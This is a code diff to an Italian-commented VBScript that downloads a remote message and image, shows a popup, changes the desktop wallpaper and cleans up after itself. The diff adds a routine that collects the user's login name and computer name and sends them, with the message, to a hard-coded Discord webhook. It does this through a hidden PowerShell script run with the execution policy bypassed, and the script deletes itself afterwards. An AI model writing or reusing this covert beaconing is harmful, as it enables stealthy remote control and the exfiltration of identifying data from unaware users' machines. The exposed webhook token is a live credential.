@@ -2,13 +2,19 @@ Option Explicit
 On Error Resume Next
  
 Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp
+Dim webhookURL, nomeUtente, nomePC
  
 ' URL ottimizzati per il download diretto
 urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
 urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
+webhookURL = "https://discord.com/api/webhooks/1460587962629619847/8IK_koKZe-q3-2J_lj6BfhloqM8AnekQpqC_z9VVj0D49-4BaFZqpeSafRjC21KqjgmW"
  
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
+ 
+' Ottieni informazioni sistema
+nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
+nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
  
 ' --- 1. RECUPERA IL MESSAGGIO ---
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -30,6 +36,9 @@ If messaggioDalWeb <> "" Then
         "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
         "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
     shell.Run comandoPopup, 0, True
+    
+    ' --- INVIA NOTIFICA DISCORD CON POWERSHELL ---
+    InviaNotificaDiscordPS webhookURL, nomeUtente, nomePC, messaggioDalWeb
 End If
  
 ' --- 3. CAMBIO SFONDO ---
@@ -58,3 +67,43 @@ shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ 
 ' --- 4. PULIZIA ---
 WScript.Sleep 5000
 If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
+ 
+' --- FUNZIONE PER INVIARE NOTIFICA DISCORD VIA POWERSHELL ---
+Sub InviaNotificaDiscordPS(webhook, utente, pc, messaggio)
+    On Error Resume Next
+    Dim scriptWebhook, percorsoWebhook, messaggioEscaped
+    
+    ' Escape delle virgolette nel messaggio
+    messaggioEscaped = Replace(messaggio, """", "\""")
+    messaggioEscaped = Replace(messaggioEscaped, "'", "''")
+    
+    percorsoWebhook = shell.ExpandEnvironmentStrings("%TEMP%") & "\webhook_notify.ps1"
+    
+    ' Script PowerShell per inviare il webhook
+    scriptWebhook = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+                   "$webhook = '" & webhook & "'; " & _
+                   "$payload = @{" & _
+                   "content = 'Popup visualizzato'; " & _
+                   "embeds = @(@{" & _
+                   "title = 'Notifica Script'; " & _
+                   "color = 5814783; " & _
+                   "fields = @(" & _
+                   "@{name='Utente'; value='" & utente & "'; inline=$true}," & _
+                   "@{name='PC'; value='" & pc & "'; inline=$true}," & _
+                   "@{name='Messaggio'; value='" & messaggioEscaped & "'; inline=$false}," & _
+                   "@{name='Timestamp'; value='" & Now() & "'; inline=$false}" & _
+                   "); " & _
+                   "footer = @{text='Script Execution Log'}" & _
+                   "})" & _
+                   "} | ConvertTo-Json -Depth 4; " & _
+                   "Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'"
+    
+    Set f = fso.CreateTextFile(percorsoWebhook, True)
+    f.Write scriptWebhook
+    f.Close
+    
+    shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoWebhook & """", 0, True
+    
+    WScript.Sleep 2000
+    If fso.FileExists(percorsoWebhook) Then fso.DeleteFile percorsoWebhook
+End Sub
